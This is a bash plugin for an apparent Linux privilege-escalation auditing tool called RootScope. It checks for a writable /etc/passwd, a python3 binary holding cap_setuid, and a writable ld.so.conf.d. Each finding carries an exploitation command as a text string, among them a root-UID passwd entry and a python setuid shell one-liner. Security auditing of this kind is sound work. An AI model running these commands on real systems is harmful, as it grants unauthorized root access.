#!/usr/bin/env bash
# ============================================================================
# RootScope — plugins/custom_checks/example_check.sh
# Example plugin demonstrating the plugin API contract.
#
# PLUGIN CONTRACT:
#   1. Define PLUGIN_NAME, PLUGIN_DESCRIPTION, PLUGIN_AUTHOR
#   2. Implement a run_plugin() function
#   3. Use emit_finding / register_finding for output
#   4. Return 0 on success, non-zero on failure
# ============================================================================

PLUGIN_NAME="example_check"
PLUGIN_DESCRIPTION="Example plugin: checks for common quick-win escalation vectors"
PLUGIN_AUTHOR="RootScope"

run_plugin() {
    print_subsection "Plugin: ${PLUGIN_NAME}"
    log_info "plugin:${PLUGIN_NAME}" "Running ${PLUGIN_DESCRIPTION}"

    # Example check 1: /etc/passwd writable
    if can_write /etc/passwd; then
        register_finding "CRITICAL" "plugin:${PLUGIN_NAME}" "writable_passwd" \
            "/etc/passwd is writable" \
            "echo 'root2:\$1\$xyz\$hash:0:0::/root:/bin/bash' >> /etc/passwd"
    fi

    # Example check 2: Python with cap_setuid
    if cmd_exists python3; then
        local py_caps
        py_caps=$(getcap "$(which python3)" 2>/dev/null)
        if echo "${py_caps}" | grep -qi "cap_setuid"; then
            register_finding "CRITICAL" "plugin:${PLUGIN_NAME}" "python_setuid_cap" \
                "python3 has cap_setuid capability" \
                "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
        fi
    fi

    # Example check 3: Writable /etc/ld.so.conf.d/
    if [[ -d /etc/ld.so.conf.d ]] && can_write /etc/ld.so.conf.d; then
        register_finding "HIGH" "plugin:${PLUGIN_NAME}" "writable_ldconf" \
            "/etc/ld.so.conf.d/ is writable" \
            "Add malicious shared library path and run ldconfig"
    fi

    log_info "plugin:${PLUGIN_NAME}" "Plugin complete"
    return 0
}
